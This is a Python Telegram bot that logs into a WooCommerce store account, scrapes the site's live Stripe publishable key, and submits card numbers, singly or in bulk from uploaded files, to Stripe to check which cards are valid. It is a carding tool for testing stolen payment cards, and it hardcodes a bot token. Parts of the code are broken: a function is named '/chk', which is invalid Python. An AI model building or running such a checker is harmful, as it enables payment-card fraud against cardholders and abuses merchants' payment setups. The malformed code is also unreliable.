import requests
import re
import threading
import logging
import json
from bs4 import BeautifulSoup
from io import BytesIO
from telegram import Update, Document
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters
)

BOT_TOKEN = "7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ"
logging.basicConfig(level=logging.INFO)
user_data = {}
lock = threading.Lock()


def get_headers():
    return {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "accept": "text/html,application/xhtml+xml",
        "accept-language": "en-US,en;q=0.9",
    }


def extract_pk(html):
    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
    return match.group(0) if match else None


def detect_stripe_type(html):
    if "setup_intent" in html:
        return "setup_intent"
    elif "payment_method" in html:
        return "payment_method"
    elif "source" in html:
        return "source"
    elif "token" in html:
        return "token"
    return "unknown"


def try_login(site, email, password, session):
    login_url = f"https://{site}/my-account/"
    r = session.get(login_url, headers=get_headers())
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})
    if not nonce:
        return False, "Login page error"
    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }
    r = session.post(login_url, data=payload, headers=get_headers())
    return ("customer-logout" in r.text), r.text


async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args or len(args) < 1 or '|' not in args[0]:
        await update.message.reply_text("Usage: /addsitelogin site.com|email|password")
        return
    site, email, password = args[0].split("|")
    session = requests.Session()
    success, _ = try_login(site, email, password, session)
    if not success:
        await update.message.reply_text("Login failed.")
        return
    with lock:
        user_data[user_id] = {
            "site": site,
            "email": email,
            "password": password,
            "session": session
        }
    await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")


async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data:
        await update.message.reply_text("Please login first using /addsitelogin")
        return
    url = update.message.text
    session = user_data[user_id]["session"]
    r = session.get(url, headers=get_headers())
    html = r.text
    pk = extract_pk(html)
    api_type = detect_stripe_type(html)
    user_data[user_id]["check_url"] = url
    user_data[user_id]["pk"] = pk
    user_data[user_id]["api_type"] = api_type
    await update.message.reply_text(f"Detected API: `{api_type}`\nExtracted PK: `{pk}`", parse_mode="Markdown")


def parse_card(card):
    match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
    return match.groups() if match else None


def submit_to_stripe(api_type, pk, cc, mm, yy, cvv):
    if len(yy) == 2:
        yy = "20" + yy
    headers = {"Authorization": f"Bearer {pk}"}
    data = {
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvv
    }

    if api_type == "payment_method":
        data["type"] = "card"
        url = "https://api.stripe.com/v1/payment_methods"
    elif api_type == "token":
        url = "https://api.stripe.com/v1/tokens"
    elif api_type == "source":
        data["type"] = "card"
        url = "https://api.stripe.com/v1/sources"
    elif api_type == "setup_intent":
        data["type"] = "card"
        url = "https://api.stripe.com/v1/payment_methods"
    else:
        return {"error": "Unsupported API type"}

    r = requests.post(url, headers=headers, data=data)
    return r.json()


async def /chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data or "pk" not in user_data[user_id]:
        await update.message.reply_text("Please login and send Add Payment URL first.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
        return
    combo = args[0]
    parsed = parse_card(combo)
    if not parsed:
        await update.message.reply_text("Invalid format. Use: cc|mm|yy|cvv")
        return
    cc, mm, yy, cvv = parsed
    pk = user_data[user_id]["pk"]
    api_type = user_data[user_id]["api_type"]
    resp = submit_to_stripe(api_type, pk, cc, mm, yy, cvv)
    await update.message.reply_text(f"`{json.dumps(resp, indent=2)}`", parse_mode="Markdown")


async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data or "pk" not in user_data[user_id]:
        await update.message.reply_text("Please login and send Add Payment URL first.")
        return
    file = await update.message.document.get_file()
    content = await file.download_as_bytes()
    combos = content.decode().splitlines()
    pk = user_data[user_id]["pk"]
    api_type = user_data[user_id]["api_type"]
    for combo in combos:
        parsed = parse_card(combo)
        if not parsed:
            await update.message.reply_text(f"{combo} -> Invalid format")
            continue
        cc, mm, yy, cvv = parsed
        resp = submit_to_stripe(api_type, pk, cc, mm, yy, cvv)
        await update.message.reply_text(f"`{json.dumps(resp, indent=2)}`", parse_mode="Markdown")


if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", /chk))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_url))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_txt))
    app.run_polling()
